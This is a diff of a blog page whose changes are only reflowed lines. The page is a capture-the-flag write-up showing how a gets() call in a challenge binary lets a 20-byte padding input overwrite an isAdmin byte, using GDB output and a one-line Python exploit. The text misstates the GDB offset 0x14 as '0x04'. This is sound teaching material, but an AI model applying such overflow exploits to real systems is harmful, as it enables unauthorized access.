@@ -22,7 +22,8 @@
 
         <div class="content">
 <h1>Junior Hacking Talent - Buffer Overflow Writeup</h1>
-<p>As always, we will be starting out with taking a peek at the source code. More specifically, the main function.</p>
+<p>As always, we will be starting out with taking a peek at the source code. More
+specifically, the main function.</p>
 <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
 <span class="p">{</span>
     <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
@@ -53,7 +54,7 @@
 <span class="p">}</span>
 </code></pre></div><p>What jumped at me is the <strong>gets()</strong> function used when reading the password.</p>
 <p>According to The Linux Manual:</p>
-<pre><code>GETS(3)                      Linux Programmer's Manual                      GETS(3)
+<pre><code>GETS(3)                     Linux Programmer's Manual                     GETS(3)
 
 NAME
        gets - get a string from standard input (DEPRECATED)
@@ -75,14 +76,19 @@ BUGS
        extremely dangerous to use. It has been used to break computer security.
        Use fgets() instead.
 
-</code></pre><p>So yeah, <strong>gets()</strong> isn&rsquo;t what you should be using when taking input as it introduces a vulnerability called Buffer Overflow.</p>
+</code></pre><p>So yeah, <strong>gets()</strong> isn&rsquo;t what you should be using when taking input as it
+introduces a vulnerability called Buffer Overflow.</p>
 <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
 <span class="kt">char</span> <span class="n">isAdmin</span> <span class="o">=</span> <span class="sc">&#39;0&#39;</span><span class="p">;</span>
-</code></pre></div><p>What this means is that, if we were able to overflow the <code>password</code> buffer, we can overwrite the value stored in the <code>isAdmin</code> variable.
-We&rsquo;ll be overwriting <code>isAdmin</code> with &lsquo;1&rsquo;, which will give us the flag needed.</p>
+</code></pre></div><p>What this means is that, if we were able to overflow the <code>password</code> buffer, we
+can overwrite the value stored in the <code>isAdmin</code> variable. We&rsquo;ll be overwriting
+<code>isAdmin</code> with &lsquo;1&rsquo;, which will give us the flag needed.</p>
 <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">if</span><span class="p">(</span><span class="n">isAdmin</span> <span class="o">==</span> <span class="sc">&#39;1&#39;</span><span class="p">)</span>
         <span class="n">print_flag</span><span class="p">();</span>
-</code></pre></div><p>Trying to run the binary by itself and logging in as <strong>Admin</strong> with a random password presents an error: <code>password.txt không tồn tại</code> which translates roughly to <code>password.txt does not exist</code>. This can be quickly fixed with a dummy file created with</p>
+</code></pre></div><p>Trying to run the binary by itself and logging in as <strong>Admin</strong> with a random
+password presents an error: <code>password.txt không tồn tại</code> which translates
+roughly to <code>password.txt does not exist</code>. This can be quickly fixed with a
+dummy file created with</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="nb">echo</span> <span class="s2">&#34;amina koyayim&#34;</span> &gt; password.txt
 </code></pre></div><p>Let&rsquo;s load binary up inside GDB with <code>gdb -q ./bof</code>.</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">gdb</span><span class="err">&gt;</span> <span class="no">disass</span> <span class="no">main</span>
@@ -104,7 +110,8 @@ We&rsquo;ll be overwriting <code>isAdmin</code> with &lsquo;1&rsquo;, which will
    <span class="err">0</span><span class="nf">x08048883</span> <span class="err">&lt;+</span><span class="mi">225</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>
 <span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
 
-</code></pre></div><p>We can see that the <strong>gets()</strong> function will be executed at the address <code>0x0804883b</code>. Let&rsquo;s set a breakpoint there and continue execution.</p>
+</code></pre></div><p>We can see that the <strong>gets()</strong> function will be executed at the address
+<code>0x0804883b</code>. Let&rsquo;s set a breakpoint there and continue execution.</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">gdb</span><span class="err">&gt;</span> <span class="no">bp</span> <span class="mi">0x0804883b</span>
 <span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x804883b</span>
 <span class="nf">gdb</span><span class="err">&gt;</span> <span class="no">r</span>
@@ -136,23 +143,31 @@ We&rsquo;ll be overwriting <code>isAdmin</code> with &lsquo;1&rsquo;, which will
          <span class="err">-------------------------</span>
 
 <span class="nf">Nhập</span> <span class="no">password</span><span class="p">:</span>
-</code></pre></div><p>Taking a closer look at the <strong>gets()</strong> instruction itself, since we know that <strong>gets()</strong> only take one argument (arg[0]) which contains the address to input buffer (<code>0xffffd5db</code>).</p>
+</code></pre></div><p>Taking a closer look at the <strong>gets()</strong> instruction itself, since we know that
+<strong>gets()</strong> only take one argument (arg[0]) which contains the address to input
+buffer (<code>0xffffd5db</code>).</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"> <span class="err">►</span> <span class="err">0</span><span class="nf">x804883b</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">153</span><span class="err">&gt;</span>                    <span class="no">call</span>   <span class="no">gets@plt</span>            <span class="err">&lt;</span><span class="no">gets@plt</span><span class="err">&gt;</span>
         <span class="nf">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0xffffd5db</span> <span class="err">◂—</span> <span class="mi">0x488dbff</span>
         <span class="nf">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x804b000</span> <span class="p">(</span><span class="no">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">—▸</span> <span class="mi">0x804af10</span> <span class="p">(</span><span class="no">_DYNAMIC</span><span class="p">)</span> <span class="err">◂—</span> <span class="mi">0x1</span>
         <span class="nf">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0xffffd5f8</span> <span class="err">◂—</span> <span class="mi">0x0</span>
         <span class="nf">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x8048822</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">128</span><span class="p">)</span> <span class="err">◂—</span> <span class="no">sub</span>    <span class="no">esp</span><span class="p">,</span> <span class="mi">0xc</span>
-</code></pre></div><p>Below that, we can see the flow of the program depends on whether the pointer to <code>[ebp - 9]</code> matches <code>0x31</code> or not.</p>
+</code></pre></div><p>Below that, we can see the flow of the program depends on whether the pointer to
+<code>[ebp - 9]</code> matches <code>0x31</code> or not.</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm">   <span class="err">0</span><span class="nf">x804886a</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">200</span><span class="err">&gt;</span>          <span class="no">cmp</span>    <span class="no">byte</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">9</span><span class="p">],</span> <span class="mi">0x31</span>
    <span class="err">0</span><span class="nf">x804886e</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">204</span><span class="err">&gt;</span>          <span class="no">jne</span>    <span class="no">main</span><span class="err">+</span><span class="mi">211</span>                     <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">211</span><span class="err">&gt;</span>
    <span class="err">0</span><span class="nf">x8048870</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">206</span><span class="err">&gt;</span>          <span class="no">call</span>   <span class="no">print_flag</span>                     <span class="err">&lt;</span><span class="no">print_flag</span><span class="err">&gt;</span>
 </code></pre></div><p>This corresponds to the <code>if</code> statement we saw earlier in the C source code.</p>
 <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">if</span><span class="p">(</span><span class="n">isAdmin</span> <span class="o">==</span> <span class="sc">&#39;1&#39;</span><span class="p">)</span>
         <span class="n">print_flag</span><span class="p">();</span>
-</code></pre></div><p>So that&rsquo;s exactly what we&rsquo;ll be doing - making sure that the program <code>call print_flag</code> by overwriting the value inside <code>[ebp - 9]</code>. To calculate the offset from the input buffer to <code>[ebp - 9]</code>, we can take <code>[ebp - 9]</code> and subtract it by the value of <code>arg[0]</code>.</p>
+</code></pre></div><p>So that&rsquo;s exactly what we&rsquo;ll be doing - making sure that the program
+<code>call print_flag</code> by overwriting the value inside <code>[ebp - 9]</code>. To calculate the
+offset from the input buffer to <code>[ebp - 9]</code>, we can take <code>[ebp - 9]</code> and
+subtract it by the value of <code>arg[0]</code>.</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">gdb</span><span class="err">&gt;</span> <span class="no">print</span> <span class="no">$ebp-0x9-0xffffd5db</span>
 <span class="nf">$1</span> <span class="err">=</span> <span class="p">(</span><span class="no">void</span> <span class="p">*)</span> <span class="mi">0x14</span>
-</code></pre></div><p>0x04 translates to 20 bytes which is also the length of padding that we&rsquo;ll need to give <strong>gets()</strong> in order to reach <code>[ebp - 9]</code>. After that, we can simply add <code>0x31</code> at the end of the padding data to overwrite the value inside <code>[ebp - 9]</code>.</p>
+</code></pre></div><p>0x04 translates to 20 bytes which is also the length of padding that we&rsquo;ll need
+to give <strong>gets()</strong> in order to reach <code>[ebp - 9]</code>. After that, we can simply add
+<code>0x31</code> at the end of the padding data to overwrite the value inside <code>[ebp - 9]</code>.</p>
 <p>A short exploit code can be written like so:</p>
 <div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">print</span><span class="p">(</span><span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">Cu64_From_Kernal.eu/&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x31</span><span class="s2">&#34;</span><span class="p">)</span>
 </code></pre></div><p>Executing it against the CTF&rsquo;s server will grant us the flag.</p>
